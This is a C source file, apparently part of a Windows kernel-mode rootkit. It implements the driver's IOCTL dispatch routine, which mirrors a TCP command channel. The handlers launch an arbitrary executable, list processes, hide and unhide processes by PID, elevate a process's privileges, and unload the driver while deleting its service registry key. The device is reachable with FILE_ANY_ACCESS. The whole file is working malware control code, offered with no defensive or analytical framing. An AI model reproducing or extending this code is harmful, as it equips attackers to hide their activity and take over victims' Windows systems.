/*==============================================================================
 * rootkit/src/ioctl.c
 *------------------------------------------------------------------------------
 * IOCTL Control Plane - Mirrors the TCP command surface.
 *
 * All IOCTLs use METHOD_BUFFERED with FILE_ANY_ACCESS.
 * Input/Output buffers are in irp->AssociatedIrp.SystemBuffer.
 *============================================================================*/
#include "../utils.h"

extern NTSTATUS dispatch_command(const UCHAR* in, ULONG in_len,
                                 UCHAR* out, ULONG out_cap, ULONG* out_len);
extern NTSTATUS delete_rootkit_service_key(VOID);

/*==============================================================================
 * IOCTL DISPATCH ROUTINE
 *------------------------------------------------------------------------------
 * Maps each IOCTL to the corresponding TCP command code and calls
 * the shared dispatch_command() function.
 *============================================================================*/
NTSTATUS ioctl_dispatch(PDEVICE_OBJECT dev, PIRP irp) {
    UNREFERENCED_PARAMETER(dev);

    PIO_STACK_LOCATION sp = IoGetCurrentIrpStackLocation(irp);
    NTSTATUS status = STATUS_SUCCESS;
    ULONG info = 0;

    switch (sp->Parameters.DeviceIoControl.IoControlCode) {

    /*--------------------------------------------------------------------------
     * IOCTL_ROOTKIT_PING (0x800)
     *   Input:  none
     *   Output: "pong"
     *-------------------------------------------------------------------------*/
    case IOCTL_ROOTKIT_PING:
        status = dispatch_command((const UCHAR*)"\x01", 1,
                                  (UCHAR*)irp->AssociatedIrp.SystemBuffer,
                                  sp->Parameters.DeviceIoControl.OutputBufferLength, &info);
        break;

    /*--------------------------------------------------------------------------
     * IOCTL_ROOTKIT_EXEC (0x801)
     *   Input:  UTF-16LE image path
     *   Output: "exec=0xXXXXXXXX"
     *-------------------------------------------------------------------------*/
    case IOCTL_ROOTKIT_EXEC: {
        UCHAR tmp[512];
        tmp[0] = CMD_EXEC;
        ULONG in = sp->Parameters.DeviceIoControl.InputBufferLength;
        if (in > sizeof(tmp) - 1) { status = STATUS_BUFFER_TOO_SMALL; break; }
        RtlCopyMemory(tmp + 1, irp->AssociatedIrp.SystemBuffer, in);
        status = dispatch_command(tmp, in + 1,
                                  (UCHAR*)irp->AssociatedIrp.SystemBuffer,
                                  sp->Parameters.DeviceIoControl.OutputBufferLength, &info);
        break;
    }

    /*--------------------------------------------------------------------------
     * IOCTL_ROOTKIT_PS (0x802)
     *   Input:  none
     *   Output: Array of RK_PROC_ENTRY
     *-------------------------------------------------------------------------*/
    case IOCTL_ROOTKIT_PS: {
        UCHAR tmp[1] = { CMD_PS };
        status = dispatch_command(tmp, 1,
                                  (UCHAR*)irp->AssociatedIrp.SystemBuffer,
                                  sp->Parameters.DeviceIoControl.OutputBufferLength, &info);
        break;
    }

    /*--------------------------------------------------------------------------
     * IOCTL_ROOTKIT_HIDE (0x803)
     * IOCTL_ROOTKIT_UNHIDE (0x804)
     * IOCTL_ROOTKIT_ELEVATE (0x805)
     *   Input:  u32 PID
     *   Output: "hide=0xXXXXXXXX" / "unhide=0xXXXXXXXX" / "elevate=0xXXXXXXXX"
     *-------------------------------------------------------------------------*/
    case IOCTL_ROOTKIT_HIDE:
    case IOCTL_ROOTKIT_UNHIDE:
    case IOCTL_ROOTKIT_ELEVATE: {
        if (sp->Parameters.DeviceIoControl.InputBufferLength < 4) {
            status = STATUS_INVALID_PARAMETER; break;
        }
        UCHAR cmd = (sp->Parameters.DeviceIoControl.IoControlCode == IOCTL_ROOTKIT_HIDE)   ? CMD_HIDE :
                    (sp->Parameters.DeviceIoControl.IoControlCode == IOCTL_ROOTKIT_UNHIDE) ? CMD_UNHIDE :
                                                                                            CMD_ELEVATE;
        UCHAR tmp[5];
        tmp[0] = cmd;
        RtlCopyMemory(tmp + 1, irp->AssociatedIrp.SystemBuffer, 4);
        status = dispatch_command(tmp, 5,
                                  (UCHAR*)irp->AssociatedIrp.SystemBuffer,
                                  sp->Parameters.DeviceIoControl.OutputBufferLength, &info);
        break;
    }

    /*--------------------------------------------------------------------------
     * IOCTL_ROOTKIT_UNLOAD (0x806)
     *   Input:  none
     *   Output: "unloading"
     *   Side effect: Deletes service registry key (best-effort)
     *-------------------------------------------------------------------------*/
    case IOCTL_ROOTKIT_UNLOAD: {
        UCHAR tmp[1] = { CMD_UNLOAD };
        status = dispatch_command(tmp, 1,
                                  (UCHAR*)irp->AssociatedIrp.SystemBuffer,
                                  sp->Parameters.DeviceIoControl.OutputBufferLength, &info);
        /* Best-effort service key removal; failure is non-fatal. */
        delete_rootkit_service_key();
        break;
    }

    /*--------------------------------------------------------------------------
     * UNKNOWN IOCTL
     *-------------------------------------------------------------------------*/
    default:
        status = STATUS_INVALID_DEVICE_REQUEST;
        break;
    }

    irp->IoStatus.Status      = status;
    irp->IoStatus.Information = info;
    IoCompleteRequest(irp, IO_NO_INCREMENT);
    return status;
}